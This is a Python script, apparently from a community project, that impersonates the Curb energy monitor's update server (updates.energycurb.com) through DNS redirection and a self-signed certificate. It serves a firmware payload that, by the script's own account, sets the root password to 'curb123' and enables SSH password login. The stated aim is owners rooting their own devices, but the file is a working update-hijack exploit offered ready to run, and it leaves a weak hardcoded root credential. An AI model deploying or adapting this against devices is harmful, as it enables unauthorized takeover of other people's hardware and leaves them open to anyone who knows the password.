#!/usr/bin/env python3
"""
Curb Energy Monitor — Community Root Access Server

Serves a firmware update payload that changes the root password to 'curb123'
and enables SSH password login.

Prerequisites:
  1. Redirect 'updates.energycurb.com' to this machine's IP in your DNS
     (Pi-hole: Local DNS → DNS Records → updates.energycurb.com → your IP)
  2. Run this script on the machine that DNS points to
  3. Wait up to 90 minutes for the Curb to check for updates

Usage:
  python3 serve.py

The server runs on ports 443 (HTTPS) and 80 (HTTP) by default. These, along
with where runtime state (webroot cache + TLS cert/key) is written and the
cert's CN, can be overridden with environment variables — used by the Docker
image in this repo to keep the container's app files read-only and persist
state on a volume instead:
  CURB_HTTP_PORT   (default: 80)
  CURB_HTTPS_PORT  (default: 443)
  CURB_DATA_DIR    (default: same directory as this script)
  CURB_CERT_CN     (default: updates.energycurb.com)

After the update, log in with:
  Serial: root / curb123 (115200 8N1 on J6 header)
  SSH:    ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa root@<curb-ip>
"""

import http.server
import ssl
import os
import re
import sys
import shutil
import subprocess
import threading
from datetime import datetime

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# DATA_DIR holds generated/runtime state (webroot cache + TLS cert/key) and
# defaults to SCRIPT_DIR to preserve the original behavior. In the Docker
# image this is set to /data so it can live on a mounted volume, keeping the
# app image itself read-only and the payload files immutable.
DATA_DIR = os.environ.get('CURB_DATA_DIR', SCRIPT_DIR)
SERVE_DIR = os.path.join(DATA_DIR, 'webroot')

HTTP_PORT = int(os.environ.get('CURB_HTTP_PORT', '80'))
HTTPS_PORT = int(os.environ.get('CURB_HTTPS_PORT', '443'))
CERT_CN = os.environ.get('CURB_CERT_CN', 'updates.energycurb.com')

# Required files
REQUIRED = [
    'os.tar.gz.gpg', 'os.tar.gz.gpg.md5sum',
    'update.tar.gz.gpg', 'update.tar.gz.gpg.md5sum'
]


def setup_webroot():
    """Create the directory structure the Curb's update script expects."""
    os.makedirs(os.path.join(SERVE_DIR, 'api/firmware'), exist_ok=True)

    for f in REQUIRED:
        src = os.path.join(SCRIPT_DIR, f)
        if not os.path.exists(src):
            print(f"ERROR: Missing {src}")
            print("Make sure all payload files are in the same directory as this script.")
            sys.exit(1)

        # Copy to generic path. Prefer a hardlink (cheap, original behavior);
        # fall back to a real copy when SERVE_DIR is on a different
        # filesystem/mount than SCRIPT_DIR (e.g. a Docker volume), where
        # hardlinks aren't possible.
        dst = os.path.join(SERVE_DIR, 'api/firmware', f)
        if not os.path.exists(dst):
            try:
                os.link(src, dst)
            except OSError:
                shutil.copy2(src, dst)

    print(f"Serving from {SERVE_DIR}")
    print("Files:")
    for f in REQUIRED:
        print(f"  /api/firmware/{f}")
        # The device also tries /api/firmware/<serial>/<file>
        # SimpleHTTPRequestHandler won't match, but the fallback to
        # generic path will work since the device tries both.
    print()


def generate_cert():
    """Generate a self-signed cert for HTTPS."""
    cert = os.path.join(DATA_DIR, 'server.pem')
    key = os.path.join(DATA_DIR, 'server.key')

    if not os.path.exists(cert):
        print("Generating self-signed certificate...")
        subprocess.run([
            'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
            '-keyout', key, '-out', cert,
            '-days', '365', '-nodes',
            '-subj', f'/CN={CERT_CN}'
        ], capture_output=True, check=True)

    return cert, key


# Matches only the real device request pattern for the password-change
# payload: GET /api/firmware/<serial>/update.tar.gz.gpg -> 200. This is
# deliberately narrower than a plain substring check on 'update.tar.gz.gpg',
# which also matches:
#   - a manual curl/browser check against the generic (non-serial) path,
#     e.g. `curl http://localhost/api/firmware/update.tar.gz.gpg`
#   - a request for the neighboring update.tar.gz.gpg.md5sum checksum file
# Both of those previously triggered a false "PAYLOAD DELIVERED" banner.
# The device is documented to request the serial-specific path (serve.py's
# do_GET() then maps it to the generic file on disk), so requiring the
# serial segment is a reliable way to tell a real device apart from a
# manual test — this is unaffected by Docker's port-forwarding hiding the
# real client IP, since it doesn't depend on `client` at all.
DEVICE_PAYLOAD_RE = re.compile(
    r'"GET /api/firmware/(?P<serial>[^/\s]+)/update\.tar\.gz\.gpg HTTP/\d\.\d" 200\b'
)


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=SERVE_DIR, **kwargs)

    def log_message(self, format, *args):
        msg = format % args
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        client = self.client_address[0]

        match = DEVICE_PAYLOAD_RE.search(msg)
        if match:
            serial = match.group('serial')
            print(f"\033[92m[{timestamp}] {client} - {msg}\033[0m")
            print(f"\033[92m  *** PAYLOAD DELIVERED to serial {serial}! The device will reboot and apply changes. ***\033[0m")
            print(f"\033[92m  *** Wait 2-3 minutes, then SSH in. Find its IP from your router's DHCP")
            print(f"\033[92m      leases (not necessarily {client} — Docker can hide the real client IP,")
            print(f"\033[92m      e.g. on Docker Desktop): ssh root@<curb-ip> (password: curb123) ***\033[0m")
        else:
            print(f"[{timestamp}] {client} - {msg}")

    def do_GET(self):
        # Handle serial-specific paths by redirecting to generic
        # /api/firmware/<serial>/file → /api/firmware/file
        parts = self.path.strip('/').split('/')
        # ['api', 'firmware', '<serial>', '<file>']
        if len(parts) == 4 and parts[0] == 'api' and parts[1] == 'firmware':
            generic = f"/api/firmware/{parts[3]}"
            if os.path.exists(os.path.join(SERVE_DIR, generic.lstrip('/'))):
                self.path = generic

        super().do_GET()


def run_server(port, ssl_context=None):
    server = http.server.HTTPServer(('0.0.0.0', port), Handler)
    if ssl_context:
        server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
    proto = "HTTPS" if ssl_context else "HTTP"
    print(f"  {proto} server listening on port {port}")
    server.serve_forever()


def main():
    print("=" * 60)
    print("  Curb Energy Monitor — Community Root Access Server")
    print("=" * 60)
    print()

    os.makedirs(DATA_DIR, exist_ok=True)
    setup_webroot()
    cert, key = generate_cert()

    # HTTPS on HTTPS_PORT (443 by default)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert, key)
    try:
        ctx.minimum_version = ssl.TLSVersion.TLSv1
    except Exception:
        pass

    print("Starting servers...")
    t_https = threading.Thread(target=run_server, args=(HTTPS_PORT, ctx), daemon=True)
    t_http = threading.Thread(target=run_server, args=(HTTP_PORT, None), daemon=True)
    t_https.start()
    t_http.start()

    print()
    print("Waiting for Curb device to check for updates...")
    print("The device checks hourly (+ random 0-30 min delay).")
    print("You may need to reboot the Curb to trigger an immediate check.")
    print()
    print("How it works:")
    print("  1. Device downloads OS checksum → sees 'new' version")
    print("  2. Downloads + decrypts dummy OS update → harmless, device reboots")
    print("  3. Device downloads software checksum → sees 'new' version")
    print("  4. Downloads + decrypts our payload → changes password + enables SSH")
    print("  5. Device reboots → log in with root / curb123")
    print()
    print("Press Ctrl+C to stop.\n")

    try:
        while True:
            t_https.join(1)
    except KeyboardInterrupt:
        print("\nStopping.")


if __name__ == '__main__':
    main()
